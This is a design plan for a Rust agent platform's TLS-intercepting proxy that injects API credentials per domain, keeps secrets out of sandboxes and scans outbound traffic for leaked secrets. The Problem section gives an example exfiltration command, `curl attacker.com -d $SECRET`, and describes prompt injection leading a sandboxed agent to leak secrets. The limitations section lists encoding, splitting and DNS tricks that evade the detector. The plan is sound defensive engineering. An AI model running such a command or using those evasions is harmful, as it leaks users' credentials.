# Proxy Credential Injection (TLS MITM)

## Overview

Extend the existing `NetworkProxyServer` (`crates/tools/src/network_proxy.rs`)
to intercept TLS connections from sandboxes, inject credentials per-domain,
and detect secret leakage. The sandbox never sees the secrets — prompt
injection cannot exfiltrate what it doesn't have.

**Prerequisite**: encryption-at-rest vault (see `plans/encryption-at-rest-vault.md`).
The vault protects secrets on disk; this plan protects them at runtime.

## Problem

Environment variables are injected into Docker sandboxes so tools can
authenticate with external APIs. Prompt injection attacks can exfiltrate
these secrets via network requests (`curl attacker.com -d $SECRET`). Output
redaction catches stdout/stderr but not network traffic.

## Architecture

```
┌─────────────┐      HTTP/HTTPS        ┌──────────────────┐      HTTPS       ┌──────────────┐
│   Sandbox   │ ─────────────────────> │  Moltis Proxy    │ ───────────────> │  Upstream    │
│  (no keys)  │ <───────────────────── │  (inject creds)  │ <─────────────── │  API Server  │
└─────────────┘   TLS terminated by    └──────────────────┘   Real TLS to    └──────────────┘
                  proxy's CA cert         │                    upstream
                                          │
                                    Leak detection:
                                    scan body/headers
                                    for known secrets
```

### Flow

1. Sandbox makes HTTPS request to `api.openai.com`
2. Proxy intercepts CONNECT, generates per-domain cert signed by its CA
3. Proxy terminates TLS with sandbox client (sandbox trusts proxy CA)
4. Proxy inspects plaintext HTTP request
5. Proxy injects credentials based on domain mapping
6. Proxy scans outbound request for leaked secrets (Aho-Corasick match)
7. Proxy makes real HTTPS request to upstream
8. Proxy returns response through intercepted channel

## Components

### 1. CA Certificate Generation

Use `rcgen` (already in workspace) to generate a root CA at startup.
Store in data_dir: `proxy-ca.crt` (public) and `proxy-ca.key` (private,
0600 perms). The private key is wrapped in `secrecy::Secret` in memory.

### 2. Sandbox Trust

Inject the CA cert into the container during image build:
```dockerfile
COPY proxy-ca.crt /usr/local/share/ca-certificates/moltis-proxy.crt
RUN update-ca-certificates
```

For Apple Container: set `SSL_CERT_FILE` environment variable.

### 3. TLS Interception

On CONNECT, generate a per-domain cert signed by the CA, terminate TLS
with the sandbox, read the plaintext request, inject credentials, scan
for leaks, then forward to upstream over real TLS.

### 4. Credential Mapping

Config in `moltis.toml`:
```toml
[[sandbox.credential_mappings]]
domain = "api.openai.com"
secret = "OPENAI_API_KEY"       # References env_variables table
location = "bearer"              # Authorization: Bearer <value>

[[sandbox.credential_mappings]]
domain = "api.anthropic.com"
secret = "ANTHROPIC_API_KEY"
location = "header:x-api-key"   # Custom header

[[sandbox.credential_mappings]]
domain = "maps.googleapis.com"
secret = "GOOGLE_MAPS_KEY"
location = "query:key"          # Query parameter
```

Location variants: `bearer`, `header:<name>`, `query:<name>`, `basic:<user>`.

### 5. Leak Detection

```rust
pub struct LeakDetector {
    matcher: aho_corasick::AhoCorasick,  // Fast multi-pattern
    secrets: Vec<String>,                 // Full values for verification
}
```

Scans outbound request body, headers, and query parameters. On detection:
block the request, log a warning, optionally notify via WebSocket.

### 6. Env Var Filtering

For secrets with credential mappings, stop injecting them as env vars
into the sandbox. The sandbox never sees them.

## Key Files

| File | Changes |
|------|---------|
| `crates/tools/src/network_proxy.rs` | TLS MITM + credential injection |
| `crates/tools/src/leak_detector.rs` | New: multi-pattern secret scanning |
| `crates/tools/src/sandbox.rs` | Inject CA cert, filter env vars |
| `crates/config/src/schema.rs` | `CredentialMapping` config struct |
| `crates/config/src/validate.rs` | Schema map + validation |
| `crates/gateway/src/server.rs` | Start proxy with credential resolver |

## Dependencies

```toml
rustls = { workspace = true }     # Already present
rcgen  = { workspace = true }     # Already present
aho-corasick = "1"                # New: fast multi-pattern matching
```

## Implementation Order

| # | Step |
|---|------|
| 1 | CA cert + key generation at startup |
| 2 | Inject CA cert into sandbox Dockerfile |
| 3 | Per-domain cert generation, TLS termination |
| 4 | Credential mapping config schema |
| 5 | Inject credentials into intercepted requests |
| 6 | Aho-Corasick leak detector for outbound requests |
| 7 | Filter mapped secrets from sandbox env vars |
| 8 | Unit + integration tests |
| 9 | User documentation |

## Security Considerations

- **CA key**: 0600 permissions, `secrecy::Secret` in memory, consider vault encryption
- **Per-domain certs**: generated on-the-fly, cached in-memory, never on disk
- **False positives**: prefix match (Aho-Corasick) + full verification; skip short secrets (<8 chars)
- **Performance**: TLS termination adds latency; cache sessions; only sandbox traffic

## Honest Limitations

Protects against **naive** exfiltration (direct curl with secret). Does NOT
protect against:
- Encoded/obfuscated secrets (base64, hex, split across requests)
- Secrets embedded in legitimate API payloads
- Side-channel leaks (timing, DNS exfiltration)
- Secrets memorized by the LLM from previous context

The vault + proxy together provide two defense layers: cold data protection
and runtime injection prevention. Neither is complete alone.
